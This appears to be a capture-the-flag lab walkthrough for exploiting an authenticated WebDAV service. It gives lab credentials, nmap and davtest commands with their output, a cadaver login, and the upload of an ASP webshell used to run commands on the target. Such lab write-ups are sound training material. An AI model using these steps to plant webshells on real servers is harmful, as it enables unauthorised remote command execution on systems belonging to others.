

A Kali GUI machine and a vulnerable target machine are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the service using the tools available on the Kali machine and exploit using Davtest and Cadaver tools.

[Davtest](https://code.google.com/archive/p/davtest/):

- Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.

[cadaver](https://github.com/grimneko/cadaver):

- Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.



**Objective:** Exploit the service and retrieve the flag!

The following username and password may be used to access the service:

| Username | Password | | bob | password_123321 |


#### Exploiting using Davtest and Cadaver
```
nmap -p- -v -T 4 10.4.16.50
```

Scan for web vulnerabilities with nmap script enum
```
nmap --script http-enum.nse 10.4.16.50

80/tcp   open  http
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)

```

Scan url with davtest tool, 
```
davtest -url 10.4.16.50

OPEN		FAIL:	10.4.16.50	Server response: Could not access 10.4.16.50/: Unauthorized
```

Use credentials to test injecting malicious code into the web browser
The program attempts to upload multiple file types for testing
```
davtest -auth bob:password_123321 -url http://10.4.16.50/webdav

PUT	txt	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.txt
PUT	pl	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.pl
PUT	cfm	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.cfm
PUT	php	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.php
PUT	html	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.html
PUT	aspx	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.aspx
PUT	shtml	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.shtml
PUT	jsp	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.jsp
PUT	asp	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.asp
PUT	jhtml	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.jhtml
PUT	cgi	SUCCEED:	http://10.4.16.50/webdav/DavTestDir_USzOu3EpPY/davtest_USzOu3EpPY.cgi

```

Login into the webdav application via cadaver 
```
cadaver http://10.4.16.50/webdav
username: bob
password: password_123321
```

Upload malicious shell to the website
```
put /usr/share/webshells/asp/webshell.asp 
```

In the web browser navigate to the malicious shell to run commands
```
http://10.4.16.50/webdav/webshell.asp
username:password
```
